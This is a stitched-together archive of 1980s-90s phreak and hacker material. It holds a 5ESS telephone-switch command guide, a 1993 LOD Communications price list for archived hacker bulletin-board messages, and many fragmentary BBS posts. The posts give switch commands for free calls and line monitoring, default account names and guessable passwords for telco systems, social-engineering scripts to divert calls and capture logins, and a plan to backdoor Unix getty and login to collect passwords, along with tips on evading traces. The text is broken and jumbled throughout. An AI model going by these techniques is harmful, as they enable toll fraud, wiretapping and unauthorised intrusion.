   number already on LINE1. If not retype the telephone number you want
   forwarded. The bottom of the screen will say "ENTER UPDATE, CHANGE, VALIDATE
   OR PRINT:", type "C" for change and hit return.

5. When it says CHANGE FIELD type "9" and enter your forward to DN (Destination
   Number) including NPA if necessary. This will put you back to the "CHANGE
   FIELD" prompt. Hit return again for the "ENTER UPDATE, CHANGE, VALIDATE OR
   PRINT:". Hit "U" for Update form and wait for "FORM UPDATED".

6. Lastly, access screen 1.12, BRCS FEATURE ACTIVATION (LINE ASSIGNMENT). At the
   prompt enter a "U" for Update, and on ROW 11 Line 1 (or wherever), change
   the "N" in column "A" to a "Y" for Yes, and you are done.

ANI/F  the whole switch
~~~~~~~~~~~~~~~~~~~~~~~

 Automatic Number Identification failure (also called "dark calls") are
caused by variety of different things.  To understand this better, here are
the technical names and causes, note this is not in stone and the causes
are not the only causes for a ANI-F to occur.

ANF   -- Failure to receive automatic number identification
         (ANI) digits on incoming local access and transport
         area (LATA) trunk.
ANF2  -- Automatic number identification (ANI) collected by
         an operator following a failure to receive ANI
         digits on an incoming centralized automatic
         message accounting (CAMA) trunk from the DTMF decoder.
ANI   -- Time-out waiting for far off-hook from Traffic
         Service Position System (TSPS) before sending ANI
         digits.

  Though, I have always wondered how to set one up myself in a safe way.
 One way nice way to get ANI/F through a 5ESS to use a inhibit command.

      INH:CAMAONI;

The command will inhibits centralized automatic message accounting (CAMA)
operator number identification (ONI) processing. This is done from the DTMF
decoder (going over later).  This message will cause a minor alarm too occur.
If in the CO when the alarm occurs, you will here this bell all the time,
because something is always going out. In this case, this alarm is a level 1
(max to five) and the bell will ring once.
  Once this message is inputed, all calls through CAMA operator will be
free of change. So just dial the operator and you will have free calls.

To place this back on the switch, just type:

      ALW:CAMAONI;

and the minor alarm will stop, and things will go back to normal.



Setting up your own BLV on the 5ESS from the Craft shell RC/V Channel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  Well, we have come to the fun part, how to access the No-Test trunk on
the 5ESS (this is also called adding the third trunk). I will not be too
specific on how to do this.  You will need to figure out just how to do this.
  The first thing you want to do is to request a seizure of a line for
interactive trunk and line testing. One must assign a test position (TP).

SET:WSPHONE,TP=a,DN=b
SET:WSPOS,TP=a,DN=b

          a = A number between 1 and 8
          b = The number you wish assigned to the test position

  This will chose a number to be the test number on the switch. Now using
the CONN:WSLINE one can set up a BLV.


CONN:WSLINE,TP=a,DN=b;

          a = TP that you set from the SET:WSPOS
          b = The number you want to BLV

To set this up on a MLHG (can come in real useful for those peksy
                           public packet switched networks), do a:

CONN:WSLINE,TP=a,MLHG=x-y;

          x = MLHG number, y = MLHG member number



To take set things back to normal and disconnect the BLV do a:

DISC:WSPHONE,TP=z

          z = TP 1 through 8


NOTE:

One may need to do a ALW:CALLMON before entering the CONN commands

BIG NOTE:

If you set your home telephone number as the test position, and you
have only one phone line, you are stupid.




Comments about the Underground
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   There are a few people out there who have no idea what they are doing, and
go on thinking they know it all (i.e. No Name Brand).  It pisses me off when
these people just go off and make shit up about things they have no idea
what they are talking about.
   This file is to all the lazy people out there that just keep bitching
and moaning about not knowing where to find information.

      The LOD Communications Underground H/P BBS Message Base Project:
     Price Listing of Currently Available Message Bases and Order Form.
                    Holdings List Version #1, 5/15/93


   This file contains:

     - Background information on the project;
     - Currently completed message bases with prices; and,
     - Order form and stipulations.

   If you have already seen some of the background information contained in the
following paragraphs, note that additional information has been added.  The aim
was to make this file as self-contained as possible.  It is approximately seven
pages in length (23K) and it should answer all of your questions.


The Project:
------------

   Throughout history, physical objects have been preserved for posterity for
the benefit of the next generation of humans.  Cyberspace, however, isn't very
physical; data contained on floppy diskettes has a finite lifetime as does the
technology to retrieve that data.  The earliest underground hacker bulletin
board systems operated at a time when TRS-80s, Commodore 64s, and Apple ][s
were state-of-the-art.  Today, it is difficult to find anyone who has one of
these machines in operating condition, not to mention the brain cells left to
recall how to operate them. :-(

   LOD Communications has created a historical library of the "dark" portion of
Cyberspace.  The project's goal is to acquire as much information as possible
from underground Hack/Phreak (H/P) bulletin boards that were in operation
during a decade long period, dating from the beginnings (in 1980/81 with 8BBS
and MOM:  Modem Over Manhattan) to the legendary OSUNY, Plover-NET, Legion of
Doom!, Metal Shop, etc. up through the Phoenix Project circa 1989/90.
Currently, messages from over 50 different BBSes have been retrieved, although
very few message bases are 100% complete.  However, not having a complete "set"
does not diminish their value.


Who Benefits From This Information?:
------------------------------------

     - PARTICIPANTS who were on the various H/P BBSes may want to see their
       contribution to history or reminisce about the "golden era" of hacking;

     - ENTHUSIASTS who came into the "scene" after most of these boards were
       down may want to see what they missed;

     - COMPANIES who may want to see if their (or their competitors') phone
       systems, computers, or networks were compromised;

     - SECURITY PROFESSIONALS/LAW ENFORCEMENT who may want to see what
       techniques were used to subvert computer security systems;

     - SCHOOLS AND UNIVERSITIES (including their libraries) who may want to use
       the information for research in sociology or computer science as well as
       for educational purposes in courses such as Computer Law, Computer
       Ethics, and Computer Security;

     - AUTHORS/PRESS who may want to finally get the facts straight about
       "hackers;" and,

     - THE CURIOUS PUBLIC who may want to sneak a peek into the inner realm of
       the Computer Underground, especially those Restricted Access BBSes and
       their Private sub-boards where only a small handful of "the best"
       resided.

   Were the individuals involved in the Computer Underground out to start World
War III, selling secrets to the Soviets, working with organized crime,
conspiring to do evil, or just a bunch of bored teenagers with nothing better
to do?  How much did they know, and how did they find it out?  Did they have
the capability to shut down phone service of Area Code portions?  Could
they ruin someone's credit?  Could they "move satellites in the heavens?"
Could they monitor packet switching network conversations or YOUR
conversations?  The answers lie within the messages themselves.


Why is LODCOM Charging Money For The Message Bases?:
----------------------------------------------------

   As happens with most projects, the effort and monetary investment turned out
to be substantially more than originally anticipated.  With all of the high-
tech equipment available today, people sometimes forget that in the early
1980s, 14.4K baud modems and 250 MB hard drives were just a fantasy for the
home computer user.  Most messages Lodcom has recovered were downloaded at 300
baud onto 143K disk drives, with each file usually no larger than 15K in size.
One could not call a BBS and download the complete message base in 10 minutes
and save it into one file.  Literally hundreds of man-hours have been spent
copying dusty Apple ][ disks, transferring them to IBM (or typing in hard copy
versions when electronic versions were unavailable), organizing over one
thousand individual files (thus far) according to what BBS the messages were
originally posted on, and splicing the files together.  Also, after consulting
with the appropriate civil liberties organizations and our own legal counsel,
a slight editing of the messages (restricted to long distance access codes,
phone numbers, and computer passwords) had to be made to ensure that there is
nothing illegal contained within the messages.  Every effort was made to keep
the messages in their pristine condition:  40 columns, ALL CAPS, spelling
errors, offensive language, inaccuracies of various kinds, and ALL.

   Although a fairly comprehensive collection of the goings-on during a decade
of public and private computer underground activity has been accomplished,
there are more messages out there.  It is our wish to continue to document the
History of the Computer Underground.  In order to do this, and in order to
break even on what resources have already been expended (it is a LOT more than
most people realize), a dollar value has been attached to each set of message
bases.  The dollar values were kept as low as possible and range from $1.00 to
$8.00 for each H/P BBS Message Base Set.  Without your understanding and
support, this effort may not be able to sustain itself long enough to complete
the project.  A large portion of any profits will be recycled for two other
projects in the works, whose aim is to provide additional historical background
on the Computer Underground Community.  That is, no one involved is quitting
their day job :-)

   One additional note:  For those who purchase the Metal Shop Private Message
Base, 100% of the price ($4.00) will be donated to help pay for Craig Neidorf's
(Knight Lightning) Legal Defense bills (due to his successful campaign to
protect First Amendment rights for electronic publishing, i.e. the PHRACK/E911
case).


How The Prices Were Determined:
-------------------------------

Prices were determined based on the following considerations:

     - The number of years ago that the BBS operated (affected availability);

     - The total number of messages compiled (required more time to compile);

     - Its popularity and message content (anticipated demand);

     - Whether the BBS or portions thereof were deemed "elite" and, therefore,
       restricted access to a small number of users (affected availability);
       and,

     - An additional factor to account for overhead costs such as diskettes,
       diskette mailing containers, postage, time to fill orders, etc.


What Each "Message Base File" Contains:
---------------------------------------

     - A two page general message explaining H/P BBS terminology and format.

     - The BBS Pro-Phile:  A historical background and description of the BBS
       either written by the original system operator(s) or those who actually
       called the BBS when it was in operation (it took months to track the
       appropriate people down and get them to write these specifically for
       this project; lesser known BBSes may not contain a Pro-Phile);

     - Messages posted to the BBS (i.e. the Message Base);

     - Downloaded Userlists if available; and

     - Hacking tutorials a.k.a. "G-Philes" that were on-line if available.


   It is anticipated that most people who are interested in the message bases
have never heard of a lot of the BBS names shown in the listing.  If you have
seen one set of messages, you have NOT seen them ALL.  Each system had a unique
personality, set of users, and each has something different to offer. If you
decide to order the minimum, we recommend that you mix a high-priced base
($7.00 or above) with a couple of medium-priced bases ($4.00 to $6.00) and a
few lower-priced bases ($1.00 to $3.00).  This will provide you with a feel for
what was happening over a broad range of years and message quality.  Of course,
nothing beats the full set (offered at a discount, see order form).

Formats the Message Base Files are Available in:
------------------------------------------------

   Due to the large size of the Message Base Files, they will be compressed
using the format of your choice.  Please note that Lodcom does NOT include the
compression/decompression program (PKZIP, PAK, etc.).  ASCII (decompressed)
files will be provided for $2.00 extra to cover additional diskette and
shipping costs.  The files are available for:

     - IBM (5.25 or 3.5 inch)
     - AMIGA (3.5 inch)
     - APPLE MACINTOSH (3.5 inch)
     - PAPER versions can be ordered but cost triple (due to increased shipping
       costs, time to print order, and messages being in 40 column format and
       therefore wasting lots of paper...save those trees!).  Paper versions
       take twice the time to deliver but are laser printed.

Orders are expected to arrive at the requesters' physical mail box in 2-4
weeks upon receipt of the order.


FAQs (Frequently Asked Questions):
----------------------------------

   QUESTION:  How long will these Message Base Files be available?

   ANSWER:  We cannot say for sure.  This is an ongoing effort and your support
            will allow us to continue until we are satisfied with having
            recovered the last decent scraps of messages out there.  Assuming
            there is a demand for these messages, all H/P BBSes of WORTH (i.e.
            NON-"codez" and NON-"warez" systems) are expected to be offered by
            the end of the Summer of 1993.  A Guesstimate of what will be
            offered is 80 to 100 Message Bases, half of which will be rather
            partial.  Orders are expected to be filled up until the end of 1993
            although this may change.  Regardless, we will send out
            notification well in advance of ceasing operations.

   QUESTION:  "Can I help out?  I have some old messages" (either on a C64,
              Apple, IBM [best for us], or printout).

   ANSWER:  Contact us ASAP!  We will work out an equitable agreement depending
            on the quantity, quality, format, and "ancientness" of the
            messages.  Your contribution will not go unrecognized.

   QUESTION:  Say if I purchase BBS "X" which has 100 messages and the next
              Version of your Price Listing shows BBS "X" now has 200 messages,
              do I have to pay the for the first 100 all over again if I want
              the other 100 messages?

   ANSWER:  No.  If a small number of additional messages are added, they will
            be sent for the price of a diskette and postage only, i.e. the
            information will be free.  If a larger number such as 100 new
            messages are added, then if you previously purchased the message
            base, the additional messages will be discounted.  Those who pay
            the Commercial Rate (corporations, government, etc.) will receive
            updates of the purchased Volume for FREE regardless of how many new
            messages there are, and LODCOM also pays for the postage and
            diskette(s).

   QUESTION:  What if I purchase the minimum order now and, when the next
              Version of the price list is released, I want to get more Message
              Bases?  Do I have to still pay the $20.00 minimum?

   ANSWER:  No.  If you are a previous customer, the minimum is cut in half,
            that is, $10.00.  Commercial customers who bought Volume #1 (the
            current "Complete Set"), are obviously not obligated to purchase
            the added Message Bases (the next Volume).

   QUESTION:  I would really like to get a feel for what one or two of the
              boards were like before I order them.  Can I get more info?

   ANSWER:  Yes.  A Sample of Actual Messages is available by performing the
            following, so long as you have TELNET access to the Internet:

   Telnet to:  198.67.3.2      [IP Address for PHANTOM.COM]
   Type:       mindvox         [To enter the Mindvox system]
   login as:   guest           [To look around]
   At prompt:  finger lodcom   [To see our Sample Messages File]

   If you do not have TELNET access to the Internet, AND your host will NOT
"bounce" a 50K file, Lodcom will send you the Sample Messages File if you
specifically request it.

Hacking/Phreaking Tutorials a.k.a. "G-Philes":
----------------------------------------------

   Along with the above H/P BBS Message Bases, LODCOM has collected many of the
old "philes" that were written and disseminated over the years.  A list of all
of them would take up too much space here, however, we can tell you that the
majority are NOT files that were originally written for electronic newsletters
such as Phrack, PHUN, ATI, etc. (with the perhaps obvious exception of the
LOD/H Technical Journal).  Those files/newsletters are readily available from
other sources.  This hodgepodge of files includes files from Bioc Agent 003,
Legion of Doom members, and many others that somehow fell out of widespread
circulation.  A Table of Contents of the collection is included but the
tutorials are all grouped together in four large files of approximately 250K
each.  This collection will have additions with each update of this file.  See
the order form for the price (price will go up as more files are added).

Greetings, Stanford phreaks! 
  
   It seems that those "strange" numbers
 are really ones that 
will appear if another person is signed 
on to the same id. 
(Like AA.TEG AA.TEG#2 AA.TEG#3 and so on
.) Also, while there 
is no MAIL facility available to "GUEST"
 accounts, there is 
a way to send a one-liner to someone els
e. The command format 
is:  TO gg.uuu msg   
Where gg.uuu is the person's id, and the
 msg is of course, 
the message. Also, their SPIRES database
 is quite 
interesting! Type CALL SPIRES, then SHOW
 SUBFILES. Then you 
must SELECT a subfile. For a complete tu
torial, try: 
TUTORIAL MASTERLIST 
SPIRES is ended by typing EXIT at the ->
 prompt. 
  
Later, MILO PHONBIL

Well, believe it or not, there is alread
y two small phreak
BBS's on The Source!!!  They have traded
 some minor info,
including some Sprint codes, and other s
uch folly.  But
the thing is, it's there, has been there
 since october '82,
and The Source knows about it, and they 
don't care!
the BBS's are on the Source's PARTIcipat
e, which, admitedely,
is a very large, powerful "thing."  In a
ddition to the
two on there now, I took the liberty to 
create my own, entitled
the "P-MENU.SAV GROUP".  It is Conferenc
e # 83.3257 .
 
Any CompuServe conference members out th
ere interested in
moving over to PARTIcipate on The Source
, let me know.
If you do not have instructions on it, I
'll mail 'em to you
if you give me your address.  I'll see w
hat I can do about
getting some more Source accounts.  A fr
iend of mine
listed 'em all!  
 
                    later,

P.S.  To all fans of my modifications to
 The Source:
      Sorry, the good 'ole boys at STC p
icked up on what
      i did to them (Snicker... haw.. ha
w) and they cor- 
      rected my modifications.  i put 'e
m back, and they
      fixed 'em again, etc, etc, until t
hey finally looked
      up in their PR1MENET REFERENCE MAN
UAL and figured out
      how to protect their accounts!  Oh

I highly recommend the proceedure mentio
ned here earlier for
staying OUT OF TROUBLE with "the competi
tion". Look for your
own passwords. Don't use the ones posted
 on BBS's except maybe
once, to "get a feel" of how the particu
lar switch works. If
possible, test the codes between 8 - 11 
AM to detirmine if they
are business codes or not. When possible
, use a local loop to
call into/out of to the switch you are u
sing. This simply adds
more frustration in the event anyone is 
tracing. When possible,
STAY AWAY completely from these OCC's, o
pting instead to use the
Wats lines from large companies, via the
ir remote call in ports.
You always want to stay away from system
s that individually 
account for each call, as MCI/Sprint do.
 WATS lines, on the
other hand, especially in older exchange
s, do not record every
number called - just the total time the 
line was in use, in
hours per month. In either case....have 
your phun now!! Cause
after the Final Judgement and Settlement
 is implemented next
year, you will place <<all>> long distan
ce calls by merely
dialing the number desired, and entering
 a two digit "choice
of carrier" code (for ATT, MCI, Sprint, 
Allnet, etc) and your
local central office will use ANI to sup
ervise your call! The
outfits like MCI will discontinue dealin
g with the public as
such, and will only deal <with other tel
ephone companies> who
in turn will act like billing/collection
 agents for MCI, etc.
Watch and see! The times are changing! N
o more phucking around!

AS MANY OF YOU KNOW, I DON'T CONFERENCE
ANYMORE SINCE INFOWORLD PUT OUT AN
ARTICLE ON IT ON MARCH 26. THE REASON
BEING: THERE ARE N-O SAFE EXCHANGES
BEING USED TODAY. EVERYONE SAYS; "BUT
THIS IS CHICAGO", "THIS IS A DALLAS
EXCHANGE", "THEY CAN'T TRACE CONFEREN-
CES!". THE LAST ONE IS MY FAVORITE. THE
SYSTEM USED BY ALMOST EVERYONE TODAY IS
ALLIANCE TELECONFERENCE. THIS IS NOT
BELL OPERATED. QUORUM IS THE BELL CONF.
SYSTEM. AND IT'S WORSE THAN ALLIANCE.
NEWS HAS IT, THAT ALLIANCE TELECON-
FERENCE MIGHT BE GOING UNDER NOW. BUT
THEY HAVE STARTED TAKING PEOPLE WITH
THEM. ( 5 TO DATE, AS I KNOW) ALLIANCE
IS SUPER-PISSED, WELL, WOULDN'T YOU BE?
AND ESPECIALLY AFTER EVERY LITTLE 15YR
OLD LEARNS HOW TO START ONE UP, HE'LL
BE JUST GETTING THEM MORE PISSED OFF.
THE ABUSE HAS GROWN TO A MAXIMUM. I AM

69> COSMOS & UNIX
---------------------------------
Msg left by: BIOC AGENT 003
Date posted: MON AUG  6 11:18:23 AM
 
COSMOS is basically a modified UNIX sys
tem.  When a non-priviledged COSMOS
user logs on, a program usually called 
/BIN/PERMIT is run.  This tells the
system which COSMOS commands the user i
s allowed to use.
 
On the other hand, when a priviledged u
ser logs in (ie, root, sys, bin, or
preop), he is put into the normal UNIX 
shell (SH) where he can utilize
UNIX commands such as:  who & cat /etc/
passwd (which will printout the 
password file).  These users can also t
ype CHDIR /USR/COSMOS and use ANY of
the COSMOS commands since COSMOS is rea
lly a sub directory in a UNIX system.
They also have a bad (good?) habit of l
eaving administrative notices and files
(such as the decrypted passwords) layin
g around in different directories of
the system.  In fact, one system down i
n Washington, DC has a BIN account
with no password (!) until some ASSHOLE
 decided to change the message of the
day"I broke in, ha, ha  --Joe Smuck"!!!
 
If you can't get into one of the privil
edged accounts then you might as well
try for a regular COSMOS account.  The 
typical setup is two letters followed
by 2 numbers.  Here are a few common on
es:
 
 
TRxx (TRaining -- eg, TR01, TR02, etc.)
LSxx(Lac Staff)
LA   (Line Assignement)
FMxx (Frame Manager)
NMxx (NAC Manager)
RSxx (Repair Service)
LMxx (LMOS debug)
etc...
 
You best bet would be too go for one of
 the managers accounts such as NM01.
There is also usually a user-name of CO
SMOS on the system.
 
The passwords are usually pathetic.  Tr
y things such as:  COSMOS, FRAME, TELCO,
etc.)  Also try simple words such as:  
CAT, BAT, RAT, etc.
 
You'll have to guess at the Wire Center
, though (WC).  It will always b 2 
letters.

78> Intro To C Search
---------------------------------
Msg left by: LORD DIGITAL
Date posted: FRI AUG 17  6:20:13 AM   {1984}
 
Ok what the program "C PW Scanner",  or
 "The C Search" does is fairly 
simple. It reads through the main passw
ord file searching for a match between 
A person's name and password and compar
es the two. If they match, or if
a person's pw is simply his name spelle
d backwards. it will write the 
pw's into a file name of your choice. T
his should net you several paswords
for every scan at least. The percentage
 of stupid people on any given 
system is usually quite high. The entir
e search should take about 5 mins.
Obviously it can't do too much consider
ing everything is crypted...
 
The entire program is internal, and ass
umes you have at least one accnt.
allready present on the system in quest
ion.
 
Instructions :>
     Pretty simple, all you do is: Uplo
ad the text file, use the CC (Compile
     C) utility, which will give you th
e "a.out" (assembly out), now just
     rename the file (mv) to whatever y
ou wish to call it...
 
If anyone wants to trade various C prog

  It might be just as easy when hacking
 idiot's passwords (User Name, same 
again; first name, same again; etc.) to
 do it the old-fashioned way--by hand.
Hey, in half an hour I found 15 account
s on my 'private' 617 VAX VMS 3.6.
Some of them are even partially privili
ged.
  Another thing, always try default pas
swords.  If the system lets priv'gd
users log in thought dial-in lines and 
the default psswds are still there,
you've struck gold.  As the wise man sa
y, "Keep it to yourself."  I once
the phone number to a Ztel Prime system
 (linked to Primenet which eventually
links to milnet) with my operator accou
nt (User:OPERATOR, no password--default)
 to a few people.  They abused the acco
unt(created 10 or 15 other accts for 
themselves) and it died within days....

I've got many switch and frame #'s to

or destroy bbs's-
 call the switch and do what I said 
 in msg 78 asking for call forwarding
 on an anonymous # (NOT your local tym-
 or tele- nets, they DO know them to be
 special dials)..when he puts it in, 
 call the "frame" #, and say "Hiya, 
 this is Bob Lineman, could you run
 into the MDF, and try to activate the
 call forwarding on NNX-XXXX? send it
 to NNX-XXXF, please, I need to check
 it out from both ends..." then, hook
 your computer up to the payphone that
 NNX-XXXF is, and set up a simulator
 for the login to that system. When you
 have it in your pocket, call the frame
 back and say "Hi, me again, would you
 just disengage the forwarding on that
 # for me? I've got the problem, but I
 need it recieving calls to fix it.."
 then you can re-hack it later if you
 want by just calling the frame again
 in a different shift..

Ahem, I don't know if I am getting moral
or something, but things are getting
pretty, well, strange.
 
First off: unix is pretty easy to crash
if you want to--but why would you want
to?  Obviously, very few people know
"everything" about Unix, and I would
like one reason that destroying a system
would be better than learning to use it's
"special" features.  If you want to get
your face on Newsweek, go ahead, but
otherwise, don't start destroying stuff
just for the sake of vandalism!  Instead
of being a vandal, do somthing Robin
Hood-ish, like nice the parent process
of the batch runner to -20 or somthing.
 Or give everyone full privilige
to / or make them all user 1.
 
Otherwise, as for metro tracing, that's
kinda hard to swallow.  Would whoever's
friend's sister care to elaborate on that
one?
 
I don't know if anyone cares, but I had
a chance to take a look at those
"goldphones" and Geez!!!  There were
codes written all over it!  I don't 
understand some people very well.  That
is simply stupidity. 
There is really nothing "new and exciting"
in phreaking anymore...  most of what you
hear is bullshit from some twelve-year-
old that just learned how to use metro last
week.  There is simply no "new" anything!
Eventually there will be, but until then
these "phreak" boards will simply be
"how to phreak"--tutorials instead of
journals.  Drat!

It wouldn't be such a great idea to scan Autonet through the Telenet
gateway.  Autonet raised a holy shit-fit when Urvile was doing it
about a year ago, and sent Telenet Security all kinds of nasty
mail bitching for them to stop whoever in 404 was connecting to their
system.  Telenet blew them off, but if it started again, Telenet might
just have to listen to their whining and crack down.  
I suggest you (or whoever is planning on this) do your scanning through a
main dialup.  It will be slower, but probably safer in the long run.

It's the Major SS buzzword these days.
Treason.  If someone is poking around in ANY system they feel is 
sensitive (although they leave sysdiag unpassworded, or lp password lp, etc..)
they will then label you as:
"A Serious Threat to National Security!"  
Give me a break.  Hell, I think my association with Par & Phoenix alone
is enough to get me the firing squad.  I haven't even done anything, 
but it seems that everything bad that's happened I keep getting
brought up, as I know such and such, or I somehow know EVERYTHING about
how such and such happened.  
Well, I've tried my best to be good, and stay out of government things, 
military things, etc...  I've even edited out the "sensitive" things I've
run across in the Telenet scanning just for their sense of well being, 
but if I begin to feel threatened, it's all going out.   Unabridged.
We will see...I'm already getting nervous...the feds are already pissed 
that LOD is still kicking, and this bbs must have SLAMMED it into their
faces.  And I know that the EFT files must have pissed them off as
well, although that may or may not have anything to do with
this bbs suddenly going back up.  
Well, I'm not a threat to ANYTHING, except myself maybe.  Anyone who
knows me knows that.  Back me up people.  This is my public announcement
of not-guilty to any and all crimes against the Security of the United
States.  So what if I was scanning 2502 a while back?  Anyone ever think
that it would be in THE INTEREST OF NATIONAL SECURITY to hop into a
Soviet system?  I thought it would.  
Par knows what I mean.  Hell, The government now seems to think he's a spy, 
and wants to shoot him.  Killing Teenagers for fun is not my idea of 
constructive problem solving guys.  Take an extended course in the 
ways of the hacker.  That education might do you all a world of good.
You may even pick up something you missed in your little weekend getaway

maybe I can educate you all a little better on what is REALLY GOING ON!

Not to nitpick, but an LMOS CP is an IBM S370 (3270 is an SNA, used to get to 
BANCS through LOMS for instance).
CRIS, as mentioned, the Customer Record Information System is a dandy little 
IBM system whose main purpose is to house customer records. There are a small 
handful of "CRIS" systems, like LCRIS (Local), and ICRIS (Integrated, which 
should be noted is used by the Residential Service Center). Here in NYNEX, the 
only way to reach these systems  (we obviously aren't hardwired hackers) is 
through BANCS, a bisync network. BANCS is not direct dialable, but IS 
available through a 3270 link on the LOMS system, used by LDMC (LAC or FACS, 
depending where you live). And LOMS IS accessible. A host of systems are also 
available through FACS (which can be reached through LOMS on BANCS) such as 
CIMAP, LMOS, SOP, TIRKS, the COSMOS-PREMISE interface, etc. So as you can see, 
rather than going after any specific system, going after the RIGHT system will 
pay off greatly (LOMS in this example). Oh, waitta-minnit, those mentioned 
systems are off of BANCS, sorry. You can reach FACS on BANCS, and access a 
couple 'o things like some of those mentioned, COSMOS (certain wire centers 
only), etc. OK, enough rambling. Let's hear someone else's input.

[MSG #12 OF 22]: INWATS & X-LATIONS
 
FROM: THE MARAUDER
DATE: MAY 08     {1985}
 
Under CCIS, INWATS (800's) are handled completely different from the older
method (the old method i don't completely uderstand, but it translated
somehow based on it's own prefix & suffix). under ccis on the other hand,
inwats #'s are handled in the following manner: when the 800 number reaches
your toll office, a query is made to the 'INWATS DATABASE', (the master
database being at the KC RNOCS I believe), i believe each RNOC (regional
network operations center, of wich there are 12, one for each region), has
their own database (which is updated on a regular basis). a query is made
(via a CCIS link) to the inwat's database, and a POTS (plain old telephone
service, just a plain 10 digit ddd telephone number, ie: npa+pre+suffix), and
the POTS number is pulsed out from the toll center and your call is completed
just like a normal ddd (direct distance dialing) call, talthough it was noted
that the call was an 800 at the origination (your) toll office, so and you
are not charged foor the call.. with this in mind, it's a simple matter for
the inwat's database that handles your reigon to return a translation that
differs from another reigons translation, for example say fred phreak in
new jersey places a call to LDX extender service at 800-XXX-3333, upon
reaching his toll center, the toll center quereys the inwat's database that
handles new jersey, and a POTS translation is returned which for obvious
reasons would be the closest port to him, so let's say the translation was
(201)-XXX-4455, the toll office upon recieving this would proceed to complete
the call, and fred phreak would be connected to LDX at (201)-XXX-4455..
 
continued next..
 
 
 
 <1-22, ^12> [?/HELP]: 
 
[MSG #13 OF 22]: ABOVE CONT'D
 
FROM: THE MARAUDER
DATE: MAY 08
 
now, on the other hand let's say bill phreak in california calls the LDX 
extender service at (800)-XXX-3333 (same number fred called from NJ), his 
regions inwat's database may return a completely different POTS x-lation say 
(213)-XXX-1119, again being ldx's closest port to bill phreaks toll center..
 
utilizing ccis, and inwat's databases, other clever things are possible for 
example, as you all know ALLIANCE teleconfrencing is unavailable on 
weekends, here's how that works: when you dial 0-700-XXX-1000, that number 
is intercepted at TSPS and translated into a corresponding WAT'S number, for
this example, we'll say it translates to (800)-XXX-1003 (white plains), and 
forwarded from tsps to a toll center, the toll center upon recieving the 
800-XXX-1003, queries it's inwat's database and a POTS translation is 
returned say 914-XXX-6677, which is the DN (Directory Number) for the 
bridge-center. now on a weekend, the inwat's database, instead of returning 
914-XXX-6677 may return 914-XXX-0077, which would terminate at a recording 
saying alliance is not reachable on weekends.., that's why everyone is 
alway's interested in the 'ALLIANCE TRANSLATIONS'. Because if you have the 
x-lation you can simply use a blue box to route yourself directly to the 
bridgecenter and bypass the whole tanslation procedure..
 
any questions, please post..

You can get them from a 4ess or some work centers like RNOC and RWC (good luck,
have a dialback).. Or from ONAC in Kansas City (816). The Operations Network
Adminstration Center is the focal point for 800 services in the AT&T network.
ONAC works in conjuction with the AT&T WATS centers (I think there are 3?) and
800 service co-ordinators to do operations, adminstration, and maintenance on
the 800 number network. You can reach the WATS centers phree of charge with a
959 plant test number in the correct NPAs (I know 914 has one). I think it was
959-5000 but that might be wrong.
 
The tech. term for an 800 xlation is a plant test number. This does not have to
be pots, but can be other system codes like 122, 195, 196, 123, etc. The only
type of 800 number that terminates in POTS is a READYLINE 800 number (AT&T). I
don't know about sprint, mci, etc. though. A good topic for investigation
though, thankx for the idea!
 
If you have access to a 4e (does anyone on her have this? If so I'll trade
anything I have for a 4e), you can type this in to translate a number:
 
well....i can't find the right notebook. it is somethink like:
 
TEST:DSIG;INWATS 800 nxx xxxx!
 
This does a Direct Signaling (DSIG) message into the 4E which commands the 4E
to pull the 800 internal number from the network control point (NCP) over CCIS
links. The 4E you are on must be included in the service area of that 800
number though, i.e. someone in the area served by that 4E would have to be able
to dial it in order for the 4E to have the xlation. So if the 4E is not in the
right area it will say 'NON SUBSCRIBED' or something of that nature. Oh, I just
remembered, there is an AT&T work group named DSAC (Direct Signaling Admin.
Center) that performs direct signaling messages into switches and things. If
you want the DSAC #, I can provide it..I don't think too many phreaks have
their number so they might be worth engineering.
 
Oh - the 800 xlation input message into the 4E was social engineered a long
time ago by The Marauder and Phucked Agent 04 from an RWC. But, thanks to a
fuck up by The Executioner and friends, the RWCs became very tight lipped...it
only takes 1 fuckup...
 
Um, I have gotten translations from the customer before, posing as AT&T and
giving them bs about 'MLT has found a potential trouble in your circuit' (haha)
and we need your translation number. I only did this once since I have never
had any major need to pull 800 xlations. But that will work in some cases if a
human answers. Or if you can get the terminating company name/location, you can
keep engineering and narrow down the locations of the xlation (say within their
centrex group or something) and then (ughh..dangerous and slow) scan for the
number, or do more engineering for it, etc...
 
There is an easier way to get 800 translations but I swore not to tell anyone
(that was the conditions of me getting the info) from a certain AT&T dept and a
certain support system...if you want a translation in an AT&T area I will try
to get it for you though....so leave mail or post and maybe I can help..

for getty, just check and see if the first entry is <something>, where that is
your back door, of sorts.  the init program will have to be a bit (?) larger
than the original, considering that you'll have to put in the stuff to make it
set up your environment & exec /bin/sh.
login, on the other hand, can put a backdoor in the gpass() routine, which can
conveniently write the passwds to a file.  not too useful to have lots of
passwds in an already backdoored system, you say?  bull.  there are lots of
southern bell systems i've gotten into by using the same passwds as the hacked
system.  also, what if they remove the backdoor?  too bad, it'll take you an
hour or so to put the source up & modify it again.
one thing that i've been thinking about: on a system, backdoor getty, login,
(for the reasons cited above), and something like 'date', to check 1) if root
is using the program, and 2) to see if your handy dandy login has been erased,
and put it back if 3) a day or so has elapsed from the last call of the 'date'.
well, i thought it was a good idea.  much better than using cron & whatever to
put a username in the passwd file.
encryption on cosmos:
it's strange, to be sure.  i tried putting a 404 cosmos passwd on your 602
cosmos. The user id's were different, the versions of cosmos were different, i
think, but the username was the same.  has anyone ever seen ANY (no matter how
old) cosmos login source?
incidentally, is anyone doing anything on sbdn of late?
scanning for addresses is generally a bad idea.

I found out some things about DMS if anyone's interested.  I only spent a
little while looking around, but I managed to figure out that the DMS does
indeed have a sort of tree structure.  I haven't figured out the structure of
TABLES yet, but I kind of know how the rest works.  Watch..
 
 Ok, from the > you can enter tasks, (I prefer to call them toolboxes because
they're like little tools you can run to perform different things.)  For
instance, you have one called LOGUTIL which is some sort of utility that keeps
tabs on various things, and you can view the logs kept.  After you have entered
LOGUTIL, you can type LIST LOGUTIL and it'll spool out commands.  You can also
type LIST LOGS to see a list of logs that are kept.
 
 The next thing I was fooling with was SERVORD, which is obviously some type of
Service Order processing software.  This toolbox is much friendlier, as it does
include the help command, and it provides help on the syntax of each command.
Unfortunately, it does not give each parameter for each command.  I'm sure that
would take up quite a lot of space.  I think you're going to need a manual to
